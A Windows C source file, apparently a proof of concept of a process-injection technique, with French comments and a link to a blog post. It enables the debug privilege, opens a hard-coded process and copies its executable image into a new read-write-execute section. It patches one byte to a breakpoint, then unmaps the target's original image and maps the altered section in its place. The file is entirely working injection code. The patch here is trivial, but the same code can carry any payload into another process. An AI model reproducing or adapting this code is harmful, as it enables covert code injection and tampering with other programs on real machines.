#include <windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

// REF : http://blog.w4kfu.com/post/new_method_of_injection

void EnableDebugPrivilege() {
	//elevator
	TOKEN_PRIVILEGES priv;
	HANDLE n1;
	LUID luid;
	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &n1)) printf("Error OPT\n");
	if(!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) printf("Error LPV\n");
	priv.PrivilegeCount=1;
	priv.Privileges[0].Luid=luid;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if(!AdjustTokenPrivileges(n1, FALSE, &priv, sizeof(priv), NULL, NULL))  printf("Error APT\n") ;
	CloseHandle(n1);
}
int main(int argc, char** argv)
{
	NTSTATUS (__stdcall *ZwMapViewOfSection) (
     HANDLE  SectionHandle,
     HANDLE  ProcessHandle,
     OUT PVOID  *BaseAddress,
     ULONG_PTR  ZeroBits,
     SIZE_T  CommitSize,
     PLARGE_INTEGER  SectionOffset,
     PSIZE_T  ViewSize,
     DWORD  InheritDisposition,
     ULONG  AllocationType,
     ULONG  Win32Protect
    );
    NTSTATUS (__stdcall *ZwCreateSection)(
     PHANDLE  SectionHandle,
     ACCESS_MASK  DesiredAccess,
     PDWORD  ObjectAttributes OPTIONAL,
     PLARGE_INTEGER  MaximumSize OPTIONAL,
     ULONG  SectionPageProtection,
     ULONG  AllocationAttributes,
     HANDLE  FileHandle OPTIONAL
    );
	NTSTATUS (__stdcall *ZwUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);
	DWORD pid, tid;
	PVOID zone;
	HANDLE hsect;
	LARGE_INTEGER a;
	a.HighPart = 0;
	a.LowPart = 0x6000;
	SIZE_T size;
	size = 0x6000;
	PVOID BaseAddress = (PVOID)0;
	HANDLE hproc;
	NTSTATUS stat;

	ZwMapViewOfSection = (long (__stdcall *)(HANDLE,HANDLE,PVOID *,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG))GetProcAddress(GetModuleHandleA("ntdll"),"ZwMapViewOfSection");
    ZwCreateSection = (long (__stdcall *)(PHANDLE,ACCESS_MASK,PDWORD,PLARGE_INTEGER,ULONG,ULONG,HANDLE))GetProcAddress(GetModuleHandleA("ntdll"),"ZwCreateSection");
	ZwUnmapViewOfSection = (long (__stdcall *)(HANDLE,PVOID))GetProcAddress(GetModuleHandleA("ntdll"),"ZwUnmapViewOfSection");
	zone = malloc(0x6000);

	EnableDebugPrivilege();
	if(!ZwMapViewOfSection || !ZwCreateSection || !ZwUnmapViewOfSection)
	{
		printf("GetProcAddr fail.\n");
		return 1;
	}

	pid = 0x31c;
	hproc=OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if(hproc == NULL)
	{
		printf("OpenProc %x fail.\n",GetLastError());
		return 1;
	}

	ReadProcessMemory(hproc,(PVOID)0x400000,zone, 0x6000, &size);
	
	//crée la section de 0x6000 dans notre process
	stat = ZwCreateSection(&hsect,SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if(stat !=STATUS_SUCCESS)
	{
		printf("ZwCreateSection %x fail.\n",stat);
		return 1;
	}

	//map la section dans notre process
	stat = ZwMapViewOfSection(hsect,GetCurrentProcess(),&BaseAddress,NULL,NULL,NULL,&size,1,NULL,PAGE_EXECUTE_READWRITE);
	if(stat !=STATUS_SUCCESS)
	{
		printf("ZwMapViewOfSection %x fail.\n",stat);
		return 1;
	}


	//now on la modifie avec notre data
	*((PBYTE)zone+0x1018) = 0xCC;
	memcpy(BaseAddress,zone,0x6000);
	
	//on unmap dans l'autre process l'ancienne zone
	BaseAddress = (PVOID)0x00400000;
	stat = ZwUnmapViewOfSection(hproc, BaseAddress);
	if(stat != STATUS_SUCCESS)
	{
		printf("ZwUnmapViewOfSection %x fail.\n",stat);
		return 1;
	}

	//on map dans le nouveau process notre zone :)
	stat = ZwMapViewOfSection(hsect, hproc, &BaseAddress, NULL, NULL, NULL, &size, 1, NULL, PAGE_EXECUTE_READWRITE);
	if(stat !=STATUS_SUCCESS)
	{
		printf("ZwMapViewOfSection %x fail.\n",stat);
		return 1;
	}

	return 0;
}
